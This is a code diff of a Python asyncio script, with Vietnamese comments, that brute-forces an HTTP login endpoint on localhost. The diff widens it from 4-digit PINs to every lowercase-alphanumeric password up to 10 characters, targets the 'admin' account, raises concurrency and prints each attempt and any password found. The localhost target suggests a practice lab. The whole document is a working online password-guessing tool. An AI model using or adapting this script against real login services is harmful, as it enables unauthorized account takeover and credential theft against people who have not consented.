@@ -1,23 +1,44 @@
 import asyncio
 import aiohttp
 import time
+import string
+import itertools
 
 API_URL = "http://localhost:8000/login"
-USERNAME = "u4"
-CONCURRENCY_LIMIT = 20  # Giới hạn số kết nối đồng thời để bảo vệ server
-BATCH_SIZE = 100        # Chia nhỏ mỗi đợt quét 500 số
+USERNAME = "admin"
+CONCURRENCY_LIMIT = 30  
+BATCH_SIZE = 100        
 
 found_password = None
 error_count = 0
-start_time = 0  # Dùng để tính thời gian ngay khi tìm thấy pass
+start_time = 0
 
-async def attempt_login(session, semaphore, pin):
+MAX_LENGTH = 10
+
+
+# Chữ cái in thường và số (36 ký tự)
+CHARSET = string.ascii_lowercase + string.digits 
+def generate_passwords():
+    for length in range(1, MAX_LENGTH + 1):
+        for combo in itertools.product(CHARSET, repeat=length):
+            yield "".join(combo)
+
+def chunk_generator(iterable, size):
+    iterator = iter(iterable)
+    while True:
+        chunk = list(itertools.islice(iterator, size))
+        if not chunk:
+            break
+        yield chunk
+
+async def attempt_login(session, semaphore, password_attempt):
     global found_password, error_count
     
     if found_password:
         return
+    # LOG CHI TIẾT TỪNG MẬT KHẨU
+    print(f"[*] Đang thử: {password_attempt}")
 
-    password_attempt = f"{pin:04d}"
     payload = {"username": USERNAME, "password": password_attempt}
 
     try:
@@ -27,7 +48,6 @@ async def attempt_login(session, semaphore, pin):
                     found_password = password_attempt
                     time_elapsed = round(time.time() - start_time, 2)
                     
-                    # Cố gắng đọc nội dung server trả về (ví dụ: JSON chứa token)
                     try:
                         resp_text = await response.text()
                     except:
@@ -35,49 +55,43 @@ async def attempt_login(session, semaphore, pin):
 
                     # IN LOG CHI TIẾT KHI TÌM THẤY
                     print("\n" + "🔥"*25)
-                    print(f"[+] BÙM! ĐÃ TÌM THẤY MẬT KHẨU!")
-                    print(f"    👉 Username  : {USERNAME}")
-                    print(f"    👉 Password  : {password_attempt}")
-                    print(f"    ⏱️ Thời gian : Mất {time_elapsed} giây")
-                    print(f"    🌐 HTTP Code : {response.status}")
-                    print(f"    📄 Server nói: {resp_text[:200]}") # Chỉ in 200 ký tự đầu để tránh rác màn hình
+                    print(f"[+]! ĐÃ TÌM THẤY MẬT KHẨU!")
+                    print(f"     Username  : {USERNAME}")
+                    print(f"     Password  : {password_attempt}")
+                    print(f"     Thời gian : Mất {time_elapsed} giây")
+                    print(f"     HTTP Code : {response.status}")
+                    print(f"     Response: {resp_text[:200]}") 
                     print("🔥"*25 + "\n")
                     
     except Exception as e:
         error_count += 1
         if error_count <= 3:
-            print(f"[-] Lỗi ở mã {password_attempt}: {e}")
+            print(f"[-] Lỗi kết nối khi thử '{password_attempt}': {e}")
 
 async def main():
     global start_time
     print(f"Bắt đầu Brute Force vào {API_URL}...")
-    print(f"Cấu hình: Bắn {CONCURRENCY_LIMIT} request/giây, chia đợt {BATCH_SIZE} số.\n")
+    print(f"Bộ ký tự : {CHARSET}")
+    print(f"Cấu hình : Tối đa {MAX_LENGTH} ký tự | {CONCURRENCY_LIMIT} luồng \n")
     
     start_time = time.time()
     semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
     connector = aiohttp.TCPConnector(limit=CONCURRENCY_LIMIT)
     
     async with aiohttp.ClientSession(connector=connector) as session:
-        # CHIA LÔ ĐỂ LOG CHI TIẾT (từ 0, bước nhảy 500)
-        for i in range(0, 10000, BATCH_SIZE):
+        password_gen = generate_passwords()
+        
+        for batch in chunk_generator(password_gen, BATCH_SIZE):
             if found_password:
-                break # Dừng vòng lặp lớn nếu đã tìm thấy
+                break
                 
-            start_pin = i
-            end_pin = min(i + BATCH_SIZE - 1, 9999)
+            tasks = [attempt_login(session, semaphore, pw) for pw in batch]
             
-            # Log ra khoảng đang quét
-            print(f"[*] Đang quét vùng mã PIN từ [{start_pin:04d}] đến [{end_pin:04d}]...")
-            
-            # Tạo task cho lô hiện tại
-            tasks = [attempt_login(session, semaphore, pin) for pin in range(start_pin, end_pin + 1)]
-            
-            # Đợi lô hiện tại chạy xong rồi mới chạy lô tiếp theo
             await asyncio.gather(*tasks)
 
     # Kết luận cuối cùng
     if not found_password:
-        print(f"\n[-] Đã quét sạch 10.000 trường hợp nhưng không trúng.")
+        print(f"\n[-] Đã quét sạch đến {MAX_LENGTH} ký tự nhưng không trúng.")
         if error_count > 0:
             print(f"[-] Cảnh báo: Có {error_count} request bị lỗi kết nối.")
         print(f"[+] Tổng thời gian: {round(time.time() - start_time, 2)} giây")
